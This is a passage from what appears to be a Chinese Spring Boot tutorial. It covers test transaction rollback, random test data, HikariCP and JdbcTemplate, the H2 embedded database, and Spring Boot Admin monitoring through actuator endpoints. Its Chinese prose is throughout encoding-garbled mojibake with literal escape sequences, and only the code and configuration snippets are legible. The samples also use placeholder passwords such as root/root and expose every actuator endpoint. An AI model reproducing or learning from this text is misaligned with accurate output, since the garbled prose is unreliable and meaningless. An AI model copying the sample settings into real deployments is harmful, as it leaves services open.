æ³¨è§£`@Transactional`å³å¯å®ç°å½“å‰æµ‹è¯•ç”¨ä¾‹çš„äº‹åŠ¡ä¸æäº¤ã€‚å½“ç¨‹åºè¿è¡Œåï¼Œspringbootå°±ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæµ‹è¯•ç¨‹åºï¼Œæ— éœ€æäº¤äº‹åŠ¡ï¼Œæ‰€ä»¥ä¹Ÿå°±å¯ä»¥é¿å…äº‹åŠ¡çš„æäº¤ã€‚\n\n```java\n@SpringBootTest\n@Transactional\n@Rollback(true)\npublic class DaoTest {\n    @Autowired\n    private BookService bookService;\n\n    @Test\n    void testSave(){\n        Book book = new Book();\n        book.setName(\"springboot3\");\n        book.setType(\"springboot3\");\n        book.setDescription(\"springboot3\");\n        bookService.save(book);\n    }\n}\n```\n\nå¦‚æœå¼€å‘è€…æƒ³æäº¤äº‹åŠ¡ï¼Œä¹Ÿå¯ä»¥ï¼Œå†æ·»åŠ ä¸€ä¸ª@RollBackçš„æ³¨è§£ï¼Œè®¾ç½®å›æ»šçŠ¶æ€ä¸ºfalseã€Œ`@RollBack(false)`ã€å³å¯æ­£å¸¸æäº¤äº‹åŠ¡ã€‚\n\n**æ€»ç»“**\n\n1. åœ¨springbootçš„æµ‹è¯•ç±»ä¸­é€šè¿‡æ·»åŠ æ³¨è§£@Transactionalæ¥é˜»æ­¢æµ‹è¯•ç”¨ä¾‹æäº¤äº‹åŠ¡\n2. é€šè¿‡æ³¨è§£@Rollbackæ§åˆ¶springbootæµ‹è¯•ç±»æ‰§è¡Œç»“æœæ˜¯å¦æäº¤äº‹åŠ¡ï¼Œéœ€è¦é…åˆæ³¨è§£@Transactionalä½¿ç”¨\n\n### â‘¤æµ‹è¯•ç”¨ä¾‹æ•°æ®è®¾å®š\n\næµ‹è¯•ç”¨ä¾‹çš„æ•°æ®å¦‚æœå›ºå®šä¹¦å†™è‚¯å®šæ˜¯ä¸åˆç†çš„ï¼Œspringbootæä¾›äº†åœ¨é…ç½®ä¸­ä½¿ç”¨éšæœºå€¼çš„æœºåˆ¶ï¼Œç¡®ä¿æ¯æ¬¡è¿è¡Œç¨‹åºåŠ è½½çš„æ•°æ®éƒ½æ˜¯éšæœºçš„ã€‚å…·ä½“å¦‚ä¸‹ï¼š\n\n```yaml\ntestcase:\n  book:\n    id: ${random.int}           # éšæœºæ•´æ•°\n    id2: ${random.int(10)}      # 10ä»¥å†…éšæœºæ•´æ•°\n    type: ${random.int(5,10)}   #  10åˆ°20éšæœºæ•´æ•°\n    name: ${random.value}       #  éšæœºå­—ç¬¦ä¸²ï¼ŒMD5å­—ç¬¦ï¼Œ32ä½\n    uuid: ${random.uuid}        #  éšæœºuuid\n    publishTime: ${random.long} #  éšæœºæ•´æ•°ï¼ˆlongèŒƒå›´ï¼‰\n```\n\nå½“å‰é…ç½®å°±å¯ä»¥åœ¨æ¯æ¬¡è¿è¡Œç¨‹åºæ—¶åˆ›å»ºä¸€ç»„éšæœºæ•°æ®ï¼Œé¿å…æ¯æ¬¡è¿è¡Œæ—¶æ•°æ®éƒ½æ˜¯å›ºå®šå€¼çš„å°´å°¬ç°è±¡å‘ç”Ÿï¼Œæœ‰åŠ©äºæµ‹è¯•åŠŸèƒ½çš„è¿›è¡Œã€‚æ•°æ®çš„åŠ è½½æŒ‰ç…§ä¹‹å‰åŠ è½½æ•°æ®çš„å½¢å¼ï¼Œä½¿ç”¨@ConfigurationPropertiesæ³¨è§£å³å¯\n\n```java\n@Component\n@Data\n@ConfigurationProperties(prefix = \"testcase.book\")\npublic class BookCase {\n    private int id;\n    private int id2;\n    private int type;\n    private String name;\n    private String uuid;\n    private long publishTime;\n}\n```\n\n**æ€»ç»“**\n\nä½¿ç”¨éšæœºæ•°æ®å¯ä»¥æ›¿æ¢æµ‹è¯•ç”¨ä¾‹ä¸­ä¹¦å†™çš„å›ºå®šæ•°æ®ï¼Œæé«˜æµ‹è¯•ç”¨ä¾‹ä¸­çš„æµ‹è¯•æ•°æ®æœ‰æ•ˆæ€§\n\n## 4.å†…ç½®æ•°æ®å±‚\n\nåŸºç¡€ç¯‡ä¸­ç”¨åˆ°çš„æ•°æ®å±‚è§£å†³æ–¹æ¡ˆæ˜¯ Mysql+Druid+MyBatisPlusã€‚è€Œä¸‰ä¸ªæŠ€æœ¯åˆ†åˆ«å¯¹åº”äº†æ•°æ®å±‚æ“ä½œçš„ä¸‰ä¸ªå±‚é¢ï¼š\n\n- æ•°æ®æºæŠ€æœ¯ï¼šDruid\n- æŒä¹…åŒ–æŠ€æœ¯ï¼šMyBatisPlus\n- æ•°æ®åº“æŠ€æœ¯ï¼šMySQL\n\né‚£ä¹ˆ SpringBoot æœ‰å†…ç½®çš„æ•°æ®è§£å†³æ–¹æ¡ˆå—ï¼Ÿ\n\n### â‘ æ•°æ®æºæŠ€æœ¯\n\nspringbootæä¾›äº†3æ¬¾å†…åµŒæ•°æ®æºæŠ€æœ¯ï¼Œåˆ†åˆ«å¦‚ä¸‹ï¼š\n\n- HikariCP\n  - springbootå®˜æ–¹æ¨èçš„æ•°æ®æºæŠ€æœ¯ï¼Œä½œä¸ºé»˜è®¤å†…ç½®æ•°æ®æºä½¿ç”¨ã€‚\n\n- Tomcatæä¾›DataSource\n  - Tomcatæä¾›çš„DataSourceï¼Œå¦‚æœä¸æƒ³ç”¨HikartCPï¼Œå¹¶ä¸”ä½¿ç”¨tomcatä½œä¸ºwebæœåŠ¡å™¨è¿›è¡Œwebç¨‹åºçš„å¼€å‘ï¼Œä½¿ç”¨è¿™ä¸ªã€‚ä½¿ç”¨æ—¶æŠŠHikartCPæŠ€æœ¯çš„åæ ‡æ’é™¤æ‰å°±OKäº†ã€‚\n\n- Commons DBCP\n  - æ—¢ä¸ä½¿ç”¨HikartCPä¹Ÿä¸ä½¿ç”¨tomcatçš„DataSourceæ—¶ï¼Œé»˜è®¤ç»™ä½ ç”¨è¿™ä¸ªã€‚\n\næˆ‘ä»¬ä¹‹å‰é…ç½®druidæ—¶ä½¿ç”¨druidçš„starterå¯¹åº”çš„é…ç½®å¦‚ä¸‹ï¼š\n\n```YAML\nspring:\n  datasource:\n    druid:\t\n   \t  url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      username: root\n      password: root\n```\n\næ¢æˆæ˜¯é»˜è®¤çš„æ•°æ®æºHikariCPåï¼Œç›´æ¥å§druidåˆ æ‰å°±è¡Œäº†ï¼Œå¦‚ä¸‹ï¼š\n\n```YAML\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    username: root\n    password: root\n```\n\nå½“ç„¶ï¼Œä¹Ÿå¯ä»¥å†™ä¸Šæ˜¯å¯¹hikariåšçš„é…ç½®ï¼Œä½†æ˜¯urlåœ°å€è¦å•ç‹¬é…ç½®ï¼Œå¦‚ä¸‹ï¼š\n\n```YAML\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n    hikari:\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      username: root\n      password: root\n```\n\nå¦‚æœæƒ³å¯¹hikariåšè¿›ä¸€æ­¥çš„é…ç½®ï¼Œå¯ä»¥ç»§ç»­é…ç½®å…¶ç‹¬ç«‹çš„å±æ€§ã€‚ä¾‹å¦‚ï¼š\n\n```yaml\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n    hikari:\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      username: root\n      password: root\n      maximum-pool-size: 50\n```\n\nå¦‚æœä¸æƒ³ä½¿ç”¨hikariæ•°æ®æºï¼Œä½¿ç”¨tomcatçš„æ•°æ®æºæˆ–è€…DBCPé…ç½®æ ¼å¼ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚å­¦ä¹ åˆ°è¿™é‡Œï¼Œä»¥åæˆ‘ä»¬åšæ•°æ®å±‚æ—¶ï¼Œæ•°æ®æºå¯¹è±¡çš„é€‰æ‹©å°±ä¸å†æ˜¯å•ä¸€çš„ä½¿ç”¨druidæ•°æ®æºæŠ€æœ¯äº†ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è‡ªè¡Œé€‰æ‹©ã€‚\n\n### â‘¡æŒä¹…åŒ–æŠ€æœ¯\n\nspringbootæä¾›äº†ä¸€å¥—ç°æˆçš„æ•°æ®å±‚æŠ€æœ¯ï¼Œå«åšJdbcTemplateã€‚\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥jdbcå¯¹åº”çš„starter\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-jdbc</artifactId>\n</dependency\n```\n\n**æ­¥éª¤â‘¡**ï¼šè‡ªåŠ¨è£…é…JdbcTemplateå¯¹è±¡\n\n```java\n@SpringBootTest\nclass Springboot15SqlApplicationTests {\n    @Test\n    void testJdbcTemplate(@Autowired JdbcTemplate jdbcTemplate){\n    }\n}\n```\n\n**æ­¥éª¤â‘¢**ï¼šä½¿ç”¨JdbcTemplateå®ç°æŸ¥è¯¢æ“ä½œï¼ˆéå®ä½“ç±»å°è£…æ•°æ®çš„æŸ¥è¯¢æ“ä½œï¼‰\n\n```java\n@Test\nvoid testJdbcTemplate(@Autowired JdbcTemplate jdbcTemplate){\n    String sql = \"select * from tbl_book\";\n    List<Map<String, Object>> maps = jdbcTemplate.queryForList(sql);\n    System.out.println(maps);\n}\n```\n\n**æ­¥éª¤â‘£**ï¼šä½¿ç”¨JdbcTemplateå®ç°æŸ¥è¯¢æ“ä½œï¼ˆå®ä½“ç±»å°è£…æ•°æ®çš„æŸ¥è¯¢æ“ä½œï¼‰\n\n```java\n@Test\nvoid testJdbcTemplate(@Autowired JdbcTemplate jdbcTemplate){\n\n    String sql = \"select * from tbl_book\";\n    RowMapper<Book> rm = new RowMapper<Book>() {\n        @Override\n        public Book mapRow(ResultSet rs, int rowNum) throws SQLException {\n            Book book = new Book();\n            book.setId(rs.getInt(\"id\"));\n            book.setName(rs.getString(\"name\"));\n            book.setType(rs.getString(\"type\"));\n            book.setDescription(rs.getString(\"description\"));\n            return book;\n        }\n    };\n    List<Book> list = jdbcTemplate.query(sql, rm);\n    System.out.println(list);\n}\n```\n\n**æ­¥éª¤â‘¤**ï¼šä½¿ç”¨JdbcTemplateå®ç°å¢åˆ æ”¹æ“ä½œ\n\n```java\n@Test\nvoid testJdbcTemplateSave(@Autowired JdbcTemplate jdbcTemplate){\n    String sql = \"insert into tbl_book values(3,'springboot1','springboot2','springboot3')\";\n    jdbcTemplate.update(sql);\n}\n```\n\nå¦‚æœæƒ³å¯¹JdbcTemplateå¯¹è±¡è¿›è¡Œç›¸å…³é…ç½®ï¼Œå¯ä»¥åœ¨ymlæ–‡ä»¶ä¸­è¿›è¡Œè®¾å®šï¼Œå…·ä½“å¦‚ä¸‹ï¼š\n\n```yaml\nspring:\n  jdbc:\n    template:\n      query-timeout: -1   # æŸ¥è¯¢è¶…æ—¶æ—¶é—´\n      max-rows: 500       # æœ€å¤§è¡Œæ•°\n      fetch-size: -1      # ç¼“å­˜è¡Œæ•°\n```\n\n### â‘¢æ•°æ®åº“æŠ€æœ¯\n\nspringbootæä¾›äº†3æ¬¾å†…ç½®çš„æ•°æ®åº“ï¼Œåˆ†åˆ«æ˜¯\n\n- H2\n- HSQL\n- Derby\n\næˆ‘ä»¬ä¸€ç›´ä½¿ç”¨MySQLæ•°æ®åº“å°±æŒºå¥½çš„ï¼Œä¸ºä»€ä¹ˆæœ‰éœ€æ±‚ç”¨è¿™ä¸ªå‘¢ï¼ŸåŸå› å°±åœ¨äºè¿™ä¸‰ä¸ªæ•°æ®åº“éƒ½å¯ä»¥é‡‡ç”¨å†…åµŒå®¹å™¨çš„å½¢å¼è¿è¡Œï¼Œåœ¨åº”ç”¨ç¨‹åºè¿è¡Œåï¼Œå¦‚æœæˆ‘ä»¬è¿›è¡Œæµ‹è¯•å·¥ä½œï¼Œæ­¤æ—¶æµ‹è¯•çš„æ•°æ®æ— éœ€å­˜å‚¨åœ¨ç£ç›˜ä¸Šï¼Œä½†æ˜¯åˆè¦æµ‹è¯•ä½¿ç”¨ï¼Œå†…åµŒæ•°æ®åº“å°±æ–¹ä¾¿äº†ï¼Œè¿è¡Œåœ¨å†…å­˜ä¸­ï¼Œè¯¥æµ‹è¯•æµ‹è¯•ï¼Œè¯¥è¿è¡Œè¿è¡Œï¼Œç­‰æœåŠ¡å™¨å…³é—­åï¼Œä¸€åˆ‡çƒŸæ¶ˆäº‘æ•£ï¼Œå¤šå¥½ï¼Œçœå¾—ä½ ç»´æŠ¤å¤–éƒ¨æ•°æ®åº“äº†ã€‚è¿™ä¹Ÿæ˜¯å†…åµŒæ•°æ®åº“çš„æœ€å¤§ä¼˜ç‚¹ï¼Œæ–¹ä¾¿è¿›è¡ŒåŠŸèƒ½æµ‹è¯•ã€‚ä¸‰æ¬¾æ•°æ®åº“è¿˜å¯ä»¥ç‹¬ç«‹å®‰è£…ã€‚\n\nä¸‹é¢ä»¥H2æ•°æ®åº“ä¸ºä¾‹è®²è§£å¦‚ä½•ä½¿ç”¨è¿™äº›å†…åµŒæ•°æ®åº“ï¼Œæ“ä½œæ­¥éª¤ä¹Ÿéå¸¸ç®€å•ï¼Œç®€å•æ‰å¥½ç”¨å˜›\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥H2æ•°æ®åº“å¯¹åº”çš„åæ ‡ï¼Œä¸€å…±2ä¸ª\n\n```xml\n<dependency>\n    <groupId>com.h2database</groupId>\n    <artifactId>h2</artifactId>\n</dependency>\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-jpa</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šå°†å·¥ç¨‹è®¾ç½®ä¸ºwebå·¥ç¨‹ï¼Œå¯åŠ¨å·¥ç¨‹æ—¶å¯åŠ¨H2æ•°æ®åº“\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤â‘¢**ï¼šé€šè¿‡é…ç½®å¼€å¯H2æ•°æ®åº“æ§åˆ¶å°è®¿é—®ç¨‹åºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ•°æ®åº“è¿æ¥è½¯ä»¶æ“ä½œ\n\n```yaml\nspring:\n  h2:\n    console:\n      enabled: true\n      path: /h2\n```\n\nwebç«¯è®¿é—®è·¯å¾„/h2ï¼Œè®¿é—®å¯†ç 123456ï¼Œå¦‚æœè®¿é—®å¤±è´¥ï¼Œå…ˆé…ç½®ä¸‹åˆ—æ•°æ®æºï¼Œå¯åŠ¨ç¨‹åºè¿è¡Œåå†æ¬¡è®¿é—®/h2è·¯å¾„å°±å¯ä»¥æ­£å¸¸è®¿é—®äº†\n\n```yaml\ndatasource:\n  url: jdbc:h2:~/test\n  hikari:\n    driver-class-name: org.h2.Driver\n    username: sa\n    password: 123456\n```\n\n**æ­¥éª¤â‘£**ï¼šä½¿ç”¨JdbcTemplateæˆ–MyBatisPlusæŠ€æœ¯æ“ä½œæ•°æ®åº“\n\nå…¶å®æˆ‘ä»¬åªæ˜¯æ¢äº†ä¸€ä¸ªæ•°æ®åº“è€Œå·²ï¼Œå…¶ä»–çš„ä¸œè¥¿éƒ½ä¸å—å½±å“ã€‚ä¸€ä¸ªé‡è¦æé†’ï¼Œåˆ«å¿˜äº†ï¼Œä¸Šçº¿æ—¶ï¼ŒæŠŠå†…å­˜çº§æ•°æ®åº“å…³é—­ï¼Œé‡‡ç”¨MySQLæ•°æ®åº“ï¼Œå…³é—­æ–¹å¼å°±æ˜¯è®¾ç½®enabledå±æ€§ä¸ºfalseå³å¯ã€‚\n\n**æ€»ç»“**\n\nç°åœ¨çš„å¯é€‰æŠ€æœ¯å°±ä¸°å¯Œå¤šäº†ï¼Œå¼€å‘ç¨‹åºæ—¶å°±å¯ä»¥åœ¨æŠ€æœ¯ä¸­ä»»é€‰ä¸€å¥—æ•°æ®åº“è§£å†³æ–¹æ¡ˆäº†ã€‚\n\n- æ•°æ®æºæŠ€æœ¯ï¼šDruidã€Hikariã€tomcat DataSourceã€DBCP\n- æŒä¹…åŒ–æŠ€æœ¯ï¼šMyBatisPlusã€MyBatisã€JdbcTemplate\n- æ•°æ®åº“æŠ€æœ¯ï¼šMySQLã€H2ã€HSQLã€Derby\n\n## 5.ç›‘æ§\n\n**ç›‘æ§çš„æ„ä¹‰**\n\n- ç›‘æ§æœåŠ¡çŠ¶æ€æ˜¯å¦å¤„ç†å®•æœºçŠ¶æ€\n\n- ç›‘æ§æœåŠ¡è¿è¡ŒæŒ‡æ ‡\n\n- ç›‘æ§ç¨‹åºè¿è¡Œæ—¥å¿—\n\n- ç®¡ç†æœåŠ¡çŠ¶æ€\n\n### â‘ å¯è§†åŒ–ç›‘æ§å¹³å°\n\n> Spring Boot Adminï¼Œè¿™æ˜¯ä¸€ä¸ªå¼€æºç¤¾åŒºé¡¹ç›®ï¼Œç”¨äºç®¡ç†å’Œç›‘æ§SpringBootåº”ç”¨ç¨‹åºã€‚è¿™ä¸ªé¡¹ç›®ä¸­åŒ…å«æœ‰å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¸¤éƒ¨åˆ†ï¼Œè€Œç›‘æ§å¹³å°æŒ‡çš„å°±æ˜¯æœåŠ¡ç«¯ã€‚æˆ‘ä»¬åšçš„ç¨‹åºå¦‚æœéœ€è¦è¢«ç›‘æ§ï¼Œå°†æˆ‘ä»¬åšçš„ç¨‹åºåˆ¶ä½œæˆå®¢æˆ·ç«¯ï¼Œç„¶åé…ç½®æœåŠ¡ç«¯åœ°å€åï¼ŒæœåŠ¡ç«¯å°±å¯ä»¥é€šè¿‡HTTPè¯·æ±‚çš„æ–¹å¼ä»å®¢æˆ·ç«¯è·å–å¯¹åº”çš„ä¿¡æ¯ï¼Œå¹¶é€šè¿‡UIç•Œé¢å±•ç¤ºå¯¹åº”ä¿¡æ¯ã€‚\n\n#### **æœåŠ¡ç«¯å¼€å‘**\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥spring-boot-adminå¯¹åº”çš„starterï¼Œç‰ˆæœ¬ä¸å½“å‰ä½¿ç”¨çš„springbootç‰ˆæœ¬ä¿æŒä¸€è‡´ï¼Œå¹¶å°†å…¶é…ç½®æˆwebå·¥ç¨‹ï¼Œä¹Ÿå¯é€šè¿‡åˆ›å»ºé¡¹ç›®æ—¶ä½¿ç”¨å‹¾é€‰çš„å½¢å¼å®Œæˆ(Ops/Codecentric's Spring Boot Admin (Server))ã€‚\n\n```xml\n<dependency>\n  <groupId>de.codecentric</groupId>\n  <artifactId>spring-boot-admin-starter-server</artifactId>\n  <version>2.7.3</version>\n</dependency>\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šåœ¨å¼•å¯¼ç±»ä¸Šæ·»åŠ æ³¨è§£@EnableAdminServerï¼Œå£°æ˜å½“å‰åº”ç”¨å¯åŠ¨åä½œä¸ºSpringBootAdminçš„æœåŠ¡å™¨ä½¿ç”¨\n\n```java\n@SpringBootApplication\n@EnableAdminServer\npublic class SpringbootAdminServerApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(SpringbootAdminServerApplication.class, args);\n    }\n}\n```\n\n**æ­¥éª¤â‘¢**ï¼šè¿è¡Œç¨‹åºï¼Œå¯åŠ¨åå°±å¯ä»¥è®¿é—® http://127.0.0.1:8080\n\n![](https://img.jwt1399.top/img/202209141909968.png)\n\n#### **å®¢æˆ·ç«¯å¼€å‘**\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥springboot adminå¯¹åº”çš„starterï¼Œç‰ˆæœ¬ä¸å½“å‰ä½¿ç”¨çš„springbootç‰ˆæœ¬ä¿æŒä¸€è‡´ï¼Œå¹¶å°†å…¶é…ç½®æˆwebå·¥ç¨‹\n\nä¸Šè¿°è¿‡ç¨‹ä¹Ÿå¯ä»¥é€šè¿‡åˆ›å»ºé¡¹ç›®æ—¶ä½¿ç”¨å‹¾é€‰çš„å½¢å¼å®Œæˆï¼Œä¸è¿‡ä¸€å®šè¦å°å¿ƒï¼Œç«¯å£é…ç½®æˆä¸æœåŠ¡ç«¯ä¸ä¸€æ ·çš„ï¼Œå¦åˆ™ä¼šå†²çªã€‚\n\n```xml\n<dependency>\n    <groupId>de.codecentric</groupId>\n    <artifactId>spring-boot-admin-starter-client</artifactId>\n    <version>2.5.4</version>\n</dependency>\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šè®¾ç½®å½“å‰å®¢æˆ·ç«¯å°†ä¿¡æ¯ä¸Šä¼ åˆ°å“ªä¸ªæœåŠ¡å™¨ä¸Šï¼Œé€šè¿‡ymlæ–‡ä»¶é…ç½®\n\n```yaml\nspring:\n  boot:\n    admin:\n      client:\n        url: http://localhost:8080  #æœåŠ¡ç«¯url\n```\n\n**æ­¥éª¤â‘¢**ï¼šè¿è¡Œç¨‹åºï¼Œå¯åŠ¨åå†æ¬¡è®¿é—®æœåŠ¡ç«¯ç¨‹åºã€‚\n\n| ![](https://img.jwt1399.top/img/202209142004101.png) | <img src=\"https://img.jwt1399.top/img/202209142004655.png\" /> |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n\nå½“å‰ç›‘æ§äº†1ä¸ªç¨‹åºï¼Œç‚¹å‡»è¿›å»æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ã€‚ç”±äºå½“å‰æ²¡æœ‰è®¾ç½®å¼€æ”¾å“ªäº›ä¿¡æ¯ç»™ç›‘æ§æœåŠ¡å™¨ï¼Œæ‰€ä»¥ç›®å‰çœ‹ä¸åˆ°ä»€ä¹ˆæœ‰æ•ˆçš„ä¿¡æ¯ã€‚ä¸‹é¢éœ€è¦åšä¸¤ç»„é…ç½®å°±å¯ä»¥çœ‹åˆ°ä¿¡æ¯äº†ã€‚\n\n1. å¼€æ”¾æŒ‡å®šä¿¡æ¯ç»™æœåŠ¡å™¨çœ‹\n\n2. å…è®¸æœåŠ¡å™¨ä»¥HTTPè¯·æ±‚çš„æ–¹å¼è·å–å¯¹åº”çš„ä¿¡æ¯\n\n\n```yaml\nspring:\n  boot:\n    admin:\n      client:\n        url: http://localhost:8080\nmanagement:\n  endpoint:\n    health:\n      show-details: always # å¼€æ”¾æ‰€æœ‰çš„å¥åº·ä¿¡æ¯\n  endpoints:\n    web:\n      exposure:\n        include: \"*\" # ä½¿ç”¨*è¡¨ç¤ºæŸ¥é˜…å…¨éƒ¨ã€‚è®°å¾—å¸¦å¼•å·\n```\n\né…ç½®åå†åˆ·æ–°æœåŠ¡å™¨é¡µé¢ï¼Œå°±å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„ä¿¡æ¯äº†ã€‚\n\n![](https://img.jwt1399.top/img/202209142006376.png)\n\nä»¥ä¸Šç•Œé¢ä¸­å±•ç¤ºçš„ä¿¡æ¯é‡å°±éå¸¸å¤§äº†ï¼ŒåŒ…å«äº†13ç»„ä¿¡æ¯ï¼Œæœ‰æ€§èƒ½æŒ‡æ ‡ç›‘æ§ï¼ŒåŠ è½½çš„beanåˆ—è¡¨ï¼ŒåŠ è½½çš„ç³»ç»Ÿå±æ€§ï¼Œæ—¥å¿—çš„æ˜¾ç¤ºæ§åˆ¶ç­‰ç­‰ã€‚**è¿˜å¯ä»¥é…ç½®å¤šä¸ªå®¢æˆ·ç«¯**ï¼Œé€šè¿‡é…ç½®å®¢æˆ·ç«¯çš„æ–¹å¼åœ¨å…¶ä»–çš„springbootç¨‹åºä¸­æ·»åŠ æœåŠ¡ç«¯åæ ‡ï¼Œè¿™æ ·å½“å‰æœåŠ¡å™¨å°±å¯ä»¥ç›‘æ§å¤šä¸ªå®¢æˆ·ç«¯ç¨‹åºäº†ã€‚\n\nè¿›å…¥ç›‘æ§é¢æ¿ï¼Œå¦‚æœä½ åŠ è½½çš„åº”ç”¨å…·æœ‰åŠŸèƒ½ï¼Œåœ¨ç›‘æ§é¢æ¿ä¸­å¯ä»¥çœ‹åˆ°3ç»„ä¿¡æ¯å±•ç¤ºçš„ä¸ä¹‹å‰åŠ è½½çš„ç©ºå·¥ç¨‹ä¸ä¸€æ ·ã€‚\n\n- ç±»åŠ è½½é¢æ¿ä¸­å¯ä»¥æŸ¥é˜…åˆ°å¼€å‘è€…è‡ªå®šä¹‰çš„ç±»\n\n- æ˜ å°„ä¸­å¯ä»¥æŸ¥é˜…åˆ°å½“å‰åº”ç”¨é…ç½®çš„æ‰€æœ‰è¯·æ±‚\n\n- æ€§èƒ½æŒ‡æ ‡ä¸­å¯ä»¥æŸ¥é˜…å½“å‰åº”ç”¨ç‹¬æœ‰çš„è¯·æ±‚è·¯å¾„ç»Ÿè®¡æ•°æ®\n\n**æ€»ç»“**\n\n1. å¼€å‘ç›‘æ§æœåŠ¡ç«¯éœ€è¦å¯¼å…¥åæ ‡ï¼Œç„¶ååœ¨å¼•å¯¼ç±»ä¸Šæ·»åŠ æ³¨è§£@EnableAdminServerï¼Œå¹¶å°†å…¶é…ç½®æˆwebç¨‹åºå³å¯\n2. å¼€å‘è¢«ç›‘æ§çš„å®¢æˆ·ç«¯éœ€è¦å¯¼å…¥åæ ‡ï¼Œç„¶åé…ç½®æœåŠ¡ç«¯æœåŠ¡å™¨åœ°å€ï¼Œå¹¶åšå¼€æ”¾æŒ‡æ ‡çš„è®¾å®šå³å¯\n3. åœ¨ç›‘æ§å¹³å°ä¸­å¯ä»¥æŸ¥é˜…åˆ°å„ç§å„æ ·è¢«ç›‘æ§çš„æŒ‡æ ‡ï¼Œå‰ææ˜¯å®¢æˆ·ç«¯å¼€æ”¾äº†è¢«ç›‘æ§çš„æŒ‡æ ‡\n\n### â‘¡ç›‘æ§åŸç†\n\né€šè¿‡æŸ¥é˜…ç›‘æ§ä¸­çš„æ˜ å°„æŒ‡æ ‡ï¼Œå¯ä»¥çœ‹åˆ°å½“å‰ç³»ç»Ÿä¸­å¯ä»¥è¿è¡Œçš„æ‰€æœ‰è¯·æ±‚è·¯å¾„ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†è·¯å¾„ä»¥/actuatorå¼€å¤´\n\n![](https://img.jwt1399.top/img/202209142034874.png)\n\né¦–å…ˆè¿™äº›è¯·æ±‚è·¯å¾„ä¸æ˜¯å¼€å‘è€…è‡ªå·±ç¼–å†™çš„ï¼Œå…¶æ¬¡è¿™ä¸ªè·¯å¾„ä»£è¡¨ä»€ä¹ˆå«ä¹‰å‘¢ï¼Ÿæ—¢ç„¶è¿™ä¸ªè·¯å¾„å¯ä»¥è®¿é—®ï¼Œå°±å¯ä»¥é€šè¿‡æµè§ˆå™¨å‘é€è¯¥è¯·æ±‚çœ‹çœ‹ç©¶ç«Ÿå¯ä»¥å¾—åˆ°ä»€ä¹ˆä¿¡æ¯ã€‚\n\n![](https://img.jwt1399.top/img/202209142035573.png)\n\né€šè¿‡å‘é€è¯·æ±‚ï¼Œå¯ä»¥å¾—åˆ°ä¸Šé¢jsonä¿¡æ¯ï¼Œå…¶ä¸­æ¯ä¸€ç»„æ•°æ®éƒ½æœ‰ä¸€ä¸ªè¯·æ±‚è·¯å¾„ï¼Œè€Œåœ¨è¿™é‡Œè¯·æ±‚è·¯å¾„ä¸­æœ‰ä¹‹å‰çœ‹åˆ°è¿‡çš„healthï¼Œå‘é€æ­¤è¯·æ±‚åˆå¾—åˆ°äº†ä¸€ç»„ä¿¡æ¯\n\n```json\n{\n    \"status\": \"UP\",\n    \"components\": {\n        \"diskSpace\": {\n            \"status\": \"UP\",\n            \"details\": {\n                \"total\": 297042808832,\n                \"free\": 72284409856,\n                \"threshold\": 10485760,\n                \"exists\": true\n            }\n        },\n        \"ping\": {\n            \"status\": \"UP\"\n        }\n    }\n}\n```\n\nå½“å‰ä¿¡æ¯ä¸ç›‘æ§é¢æ¿ä¸­çš„æ•°æ®å­˜åœ¨ç€å¯¹åº”å…³ç³»\n\n<img src=\"https://img.jwt1399.top/img/202209142038284.png\" />\n\nåŸæ¥ç›‘æ§ä¸­æ˜¾ç¤ºçš„ä¿¡æ¯å®é™…ä¸Šæ˜¯é€šè¿‡å‘é€è¯·æ±‚åå¾—åˆ°jsonæ•°æ®ï¼Œç„¶åå±•ç¤ºå‡ºæ¥ã€‚æŒ‰ç…§ä¸Šè¿°æ“ä½œï¼Œå¯ä»¥å‘é€æ›´å¤šçš„ä»¥/actuatorå¼€å¤´çš„é“¾æ¥åœ°å€ï¼Œè·å–æ›´å¤šçš„æ•°æ®ï¼Œè¿™äº›æ•°æ®æ±‡æ€»åˆ°ä¸€èµ·ç»„æˆäº†ç›‘æ§å¹³å°æ˜¾ç¤ºçš„æ‰€æœ‰æ•°æ®ã€‚\n\nåˆ°è¿™é‡Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªæ 